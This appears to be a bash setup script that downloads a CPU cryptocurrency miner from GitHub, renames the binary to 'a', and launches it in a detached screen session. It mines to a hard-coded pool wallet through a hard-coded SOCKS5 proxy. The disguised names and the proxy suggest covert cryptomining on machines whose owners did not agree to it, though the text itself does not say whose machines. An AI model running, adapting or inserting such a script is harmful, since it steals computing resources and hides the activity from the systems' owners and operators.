#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
screen -dmS ls
PROXY=socks5://98.178.72.8:4145
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
mv cpuminer-avx2 a
./a -a lyra2z330 -o stratum+tcp://lyra2z330.sea.mine.zpool.ca:4563 -u MK3aSa6UtVfoZm6xmS9U39t3zSbmjDDgRJ -p c=LTC,zap=PYRK-lyra2z330 -t 8 -x socks5://98.178.72.8:4145
